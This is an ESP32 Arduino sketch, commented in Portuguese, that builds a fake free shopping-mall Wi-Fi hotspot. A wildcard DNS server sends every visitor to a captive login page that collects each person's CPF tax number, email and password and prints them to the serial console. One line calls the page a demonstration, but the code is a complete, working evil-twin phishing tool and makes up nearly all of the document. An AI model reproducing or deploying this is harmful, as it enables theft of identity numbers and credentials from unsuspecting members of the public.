#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

// --- CONFIGURAÇÕES DA REDE ---
const char* ssid = "Shopping Wi-Fi Gratuito";
const byte DNS_PORT = 53;

// --- OBJETOS ---
DNSServer dnsServer;
WebServer server(80);

// --- PÁGINA WEB (HTML + CSS) ---
String loginPage = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bem-vindo ao Wi-Fi</title>
  <style>
    body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .login-container { background-color: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
    h2 { color: #333; margin-bottom: 20px; }
    input[type="text"], input[type="email"], input[type="password"] {
      width: calc(100% - 20px); padding: 10px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 4px;
    }
    button {
      width: 100%; padding: 12px; background-color: #007bff; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;
    }
    button:hover { background-color: #0056b3; }
    .logo { max-width: 150px; margin-bottom: 20px; }
  </style>
</head>
<body>
  <div class="login-container">
    <img src="https://i.imgur.com/your-logo-image.png" alt="Logo" class="logo"> <h2>Acesse nossa rede Wi-Fi</h2>
    <form action="/login" method="GET">
      <input type="text" id="cpf" name="cpf" placeholder="Seu CPF" required>
      <input type="email" id="email" name="email" placeholder="Seu E-mail" required>
      <input type="password" id="senha" name="senha" placeholder="Crie uma Senha" required>
      <button type="submit">Conectar</button>
    </form>
  </div>
</body>
</html>
)rawliteral";

String successPage = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Conectado</title>
  <style>
    body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
    .success-container { background-color: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
    h1 { color: #28a745; }
    p { color: #333; font-size: 18px; }
  </style>
</head>
<body>
  <div class="success-container">
    <h1>Conexão Bem-Sucedida!</h1>
    <p>Obrigado por se registrar. Você já pode navegar.</p>
    <p>(Neste exemplo, o acesso à internet não é liberado. Isto é apenas uma demonstração.)</p>
  </div>
</body>
</html>
)rawliteral";

// --- FUNÇÕES ---
void handleRoot() {
  server.send(200, "text/html", loginPage);
}

void handleLogin() {
  Serial.println("Recebemos dados do formulário!");

  String cpf = server.arg("cpf");
  String email = server.arg("email");
  String senha = server.arg("senha");

  Serial.print("CPF: ");
  Serial.println(cpf);
  Serial.print("Email: ");
  Serial.println(email);
  Serial.print("Senha: ");
  Serial.println(senha);
  Serial.println("--------------------");

  server.send(200, "text/html", successPage);
}

// --- SETUP ---
void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("\nConfigurando Portal Cativo...");

  WiFi.softAP(ssid);
  IPAddress apIP = WiFi.softAPIP();
  Serial.print("IP do Ponto de Acesso: ");
  Serial.println(apIP);

  dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println("Servidor DNS iniciado.");

  server.on("/", HTTP_GET, handleRoot);
  server.on("/login", HTTP_GET, handleLogin);
  server.onNotFound(handleRoot);

  server.begin();
  Serial.println("Servidor Web iniciado.");
  Serial.println("Portal Cativo pronto para conexões!");
}

// --- LOOP ---
void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}